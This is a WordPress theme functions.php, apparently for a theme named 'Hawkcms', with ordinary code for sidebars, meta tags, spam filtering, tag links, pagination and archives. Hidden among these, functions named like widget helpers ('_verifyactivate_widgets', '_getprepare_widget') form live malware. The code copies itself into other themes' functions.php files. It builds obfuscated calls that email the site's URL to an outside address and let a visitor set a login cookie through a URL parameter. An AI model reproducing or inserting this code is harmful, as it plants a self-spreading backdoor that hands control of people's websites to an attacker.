function dmeng_highlight_keyword($key, $content){
	$key = addcslashes(trim($key),'\/');
	if(!empty($key)){
		$keys = implode('|', explode(' ', $key));
		$content = preg_replace('/(' . $keys .')/iu', '<em>\0</em>', $content);
	}
	return $content;
}

add_filter( 'widget_text', 'do_shortcode' );
?>
<?php
$theme_name = 'Hawkcms';

add_action( 'after_setup_theme', 'init_setup_theme' );

//include('theme-option.php');

add_filter( 'pre_option_link_manager_enabled', '__return_true' );

function dopt($e){
    return stripslashes(get_option($e));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
        'name'          => '首页侧栏',
        'id'            => 'widget_homesidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name'          => '文章页侧栏',
        'id'            => 'widget_postsidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
}
function init_setup_theme(){

    //去除头部冗余代码
    remove_action( 'wp_head',   'feed_links_extra', 3 );
    remove_action( 'wp_head',   'rsd_link' );
    remove_action( 'wp_head',   'wlwmanifest_link' );
    remove_action( 'wp_head',   'index_rel_link' );
    remove_action( 'wp_head',   'start_post_rel_link', 10, 0 );
	remove_action( 'wp_head',   'wp_shortlink_wp_head', 10, 0 );
    //隐藏admin Bar
	function hide_admin_bar($flag) {
		return false;
	}
	add_filter('show_admin_bar','hide_admin_bar');

    //关键字
    add_action('wp_head','set_meta_keywords');

    //页面描述
    add_action('wp_head','set_meta_description');

    //阻止站内PingBack
    if( dopt('d_pingback_b') != '' ){
        add_action('pre_ping','noself_ping');
    }

    //Gzip压缩
    add_action('init','ux_gzip');

    //文章末尾增加版权
    add_filter('the_content','set_copyright');

    //移除自动保存和修订版本
    if( dopt('d_autosave_b') != '' ){
        add_action('wp_print_scripts','ux_disable_autosave' );
        remove_action('pre_post_update','wp_save_post_revision' );
    }

    //去除自带js
    wp_deregister_script( 'l10n' );

    //修改默认发信地址
    add_filter('wp_mail_from', 'res_from_email');
    add_filter('wp_mail_from_name', 'res_from_name');

    //缩略图设置
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(140, 98, true);

    add_editor_style('editor-style.css');

    //定义菜单
    if (function_exists('register_nav_menus')){
        register_nav_menus( array(
            'nav' => __('导航'),
            'footer' => __('底部链接'),
            'menu' => __('页面菜单')
        ) );
    }

}

// 取消原有jQuery
if ( !is_admin() ) {
    if ( $localhost == 0 ) {
        function my_init_method() {
            wp_deregister_script( 'jquery' );
        }
        add_action('init', 'my_init_method');
    }
}

$dHasShare = false;
function default_avatar_url($mail){
  $p = get_bloginfo('template_directory').'/default.png';
  if($mail=='') return $p;
  preg_match("/src='(.*?)'/i", get_avatar( $mail,'36',$p ), $matches);
  return $matches[1];
}

//评论头像缓存
function set_comment_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $w = get_bloginfo('wpurl');
  $e = ABSPATH .'avatar/'. $f .'.png';
  $t = dopt('d_avatarDate')*24*60*60;
  if ( !is_file($e) || (time() - filemtime($e)) > $t )
    copy(htmlspecialchars_decode($g), $e);
  else
    $avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.png'));
  if ( filesize($e) < 500 )
    copy(get_bloginfo('template_directory').'/img/default.png', $e);
  return $avatar;
}


//关键字
function set_meta_keywords() {
  global $s, $post;
  $keywords = '';
  if ( is_single() ) {
    if ( get_the_tags( $post->ID ) ) {
      foreach ( get_the_tags( $post->ID ) as $tag ) $keywords .= $tag->name . ', ';
    }
    foreach ( get_the_category( $post->ID ) as $category ) $keywords .= $category->cat_name . ', ';
    $keywords = substr_replace( $keywords , '' , -2);
  } elseif ( is_home () )    { $keywords = dopt('d_keywords');
  } elseif ( is_tag() )      { $keywords = single_tag_title('', false);
  } elseif ( is_category() ) { $keywords = single_cat_title('', false);
  } elseif ( is_search() )   { $keywords = esc_html( $s, 1 );
  } else { $keywords = trim( wp_title('', false) );
  }
  if ( $keywords ) {
    echo "<meta name=\"keywords\" content=\"$keywords\">\n";
  }
}

//网站描述
function set_meta_description() {
  global $s, $post;
  $description = '';
  $blog_name = get_bloginfo('name');
  if ( is_singular() ) {
    if( !empty( $post->post_excerpt ) ) {
      $text = $post->post_excerpt;
    } else {
      $text = $post->post_content;
    }
    $description = trim( str_replace( array( "\r\n", "\r", "\n", "　", " "), " ", str_replace( "\"", "'", strip_tags( $text ) ) ) );
    if ( !( $description ) ) $description = $blog_name . "-" . trim( wp_title('', false) );
  } elseif ( is_home () )    { $description = $blog_name . "-" . get_bloginfo('description') . dopt('d_description'); // 首頁要自己加
  } elseif ( is_tag() )      { $description = $blog_name . "'" . single_tag_title('', false) . "'";
  } elseif ( is_category() ) { $description = $blog_name . "'" . single_cat_title('', false) . "'";
  } elseif ( is_archive() )  { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  } elseif ( is_search() )   { $description = $blog_name . ": '" . esc_html( $s, 1 ) . "' 的搜索結果";
  } else { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  }
  $description = mb_substr( $description, 0, 220, 'utf-8' ) . '..';
  echo "<meta name=\"description\" content=\"$description\">\n";
}

//阻止站内文章Pingback
function noself_ping( &$links ) {
  $home = get_option( 'home' );
  foreach ( $links as $l => $link )
  if ( 0 === strpos( $link, $home ) )
  unset($links[$l]);
}

//移除自动保存
function ux_disable_autosave() {
  wp_deregister_script('autosave');
}

//垃圾评论拦截
class anti_spam {
  function anti_spam() {
    if ( !current_user_can('level_0') ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('init', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $spamcom = isset($_POST['comment'])        ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "$spamcom";
    }
  }

  function sink( $comment ) {
  $email = $comment['comment_author_email'];
  $g = 'http://www.gravatar.com/avatar/'. md5( strtolower( $email ) ). '?d=404';
  $headers = @get_headers( $g );
    if ( !preg_match("|200|", $headers[0]) ) {
      add_filter('pre_comment_approved', create_function('', 'return "0";'));
    }
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      die();
      add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      $comment['comment_content'] = $_POST['spam_confirmed'];
    }
    return $comment;
  }
}
$anti_spam = new anti_spam();

//Gzip压缩
function ux_gzip() {
  if ( strstr($_SERVER['REQUEST_URI'], '/js/tinymce') )
    return false;
  if ( ( ini_get('zlib.output_compression') == 'On' || ini_get('zlib.output_compression_level') > 0 ) || ini_get('output_handler') == 'ob_gzhandler' )
    return false;
  if (extension_loaded('zlib') && !ob_start('ob_gzhandler'))
    ob_start();
}


//修改默认发信地址
function res_from_email($email) {
    $wp_from_email = get_option('admin_email');
    return $wp_from_email;
}
function res_from_name($email){
    $wp_from_name = get_option('blogname');
    return $wp_from_name;
}

//文章（包括feed）末尾加版权说明
function set_copyright($content) {
	  if( !is_page() ){
		
		$content .= wp_link_pages(array('before' => '<div class="fenye">', 'after' => '', 'next_or_number' => 'next', 'previouspagelink' => '上一页', 'nextpagelink' => ""));
		$content .= wp_link_pages(array('before' => '', 'after' => '', 'next_or_number' => 'number', 'link_before' =>'<span>', 'link_after'=>'</span>'));
		$content .= wp_link_pages(array('before' => '', 'after' => '</div>', 'next_or_number' => 'next', 'previouspagelink' => '', 'nextpagelink' => "下一页"));

       $content.= '<p>转载注明:<a href="'.get_permalink().'">'.'('.get_permalink().')</a></p>';
    }
    if( is_feed() ){
        $content.= rss_postrelated();
    }
    return $content;
}

function rss_postrelated(){
    $exclude_id = $post->ID;
    $posttags = get_the_tags();
    $i = 0;
    $limit = 6 ;
    if ( $posttags ) {
      $tags = ''; foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
      $args = array(
        'post_status' => 'publish',
        'tag_slug__in' => explode(',', $tags),
        'post__not_in' => explode(',', $exclude_id),
        'caller_get_posts' => 1,
        'orderby' => 'comment_date',
        'posts_per_page' => $limit
      );
      query_posts($args);
      while( have_posts() ) { the_post();
        $output .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
        $exclude_id .= ',' . $post->ID; $i ++;
      };
      return '<h4 style="font-size:14px;margin:10px 0;border-bottom:solid 1px #ddd;">继续阅读相关文章：</h4><ul style="line-height:20px;">'.$output.'</ul>';
      wp_reset_query();
    }
}

function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home");
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1;
	if(!isset($com_type)) $com_type="";
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved="";
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter;
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
	if(!isset($isshowdots)) $isshowdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

add_filter('widget_tag_cloud_args','style_tags');  //修改标签云样式
//修改标签云样式
function style_tags($args) {
$args = array(
  'largest'=> '8',
  'smallest'=> '8',
  'format'=> 'flat',
  'number' => '21',
  'orderby' => 'count',
  'order' => 'DESC'
);
return $args;
}
// 文章添加关键词链接
//连接数量
$match_num_from = 1;  //一篇文章中同一个关键字少于多少不秒文本（这个直接填1就好了）
$match_num_to = 1; //一篇文章中同一个关键字最多出现多少次描文本（建议不超过2次）
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//改变标签关键字
function tag_link($content){
	global $match_num_from,$match_num_to;
	$posttags = get_the_tags();
	if ($posttags) {
		usort($posttags, "tag_sort");
		foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<span class=\"tag-span\"><a class=\"tag\" href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a></span>";
			$limit = rand($match_num_from,$match_num_to);

			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);

			$cleankeyword = preg_quote($cleankeyword,'\'');

			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;

			$content = preg_replace($regEx,$url,$content,$limit);

			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);

		}
	}
	return $content;
}
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}

//分页函数
function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a></li>";}
	echo '<li>';previous_posts_link('上一页');echo "</li>";
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a></li>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}

	echo '<li>';next_posts_link(' 下一页 ');echo "</li>";
    if($paged != $max_page){echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a></li>";}}
}


//文章归档
function archives_list_SHe() {
	global $wpdb,$month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_'.$lastpost);
	if(empty($output)){
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
			$thismonth    = zeroise($monthresult->month, 2);
			$thisyear    = $monthresult->year;
			$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
			$postresults = $wpdb->get_results($q);
			if ($postresults) {
				$text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
				$postcount = count($postresults);
				$output .= '<dl><dt><strong>' . $text . '</strong> &nbsp;(' . count($postresults) . '&nbsp;' . __('篇文章','freephp') . ')</dt>' . "\n";
			foreach ($postresults as $postresult) {
				if ($postresult->post_date != '0000-00-00 00:00:00') {
				$url = get_permalink($postresult->ID);
				$arc_title    = $postresult->post_title;
				if ($arc_title)
					$text = wptexturize(strip_tags($arc_title));
				else
					$text = $postresult->ID;
					$title_text = __('View this post','freephp') . ', &quot;' . wp_specialchars($text, 1) . '&quot;';
					$output .= '<dd>' . mysql2date('m-d', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
					$output .= '&nbsp;(' . $postresult->comment_count . ')';
					$output .= '</dd>' . "\n";
				}
				}
			}
			$output .= '</dl>' . "\n";
			}
        update_option('SHe_archives_'.$lastpost,$output);
		}else{
			$output = '<div class="errorbox">'. __('Sorry, no posts matched your criteria.','freephp') .'</div>' . "\n";
		}
	}
	echo $output;
}
?>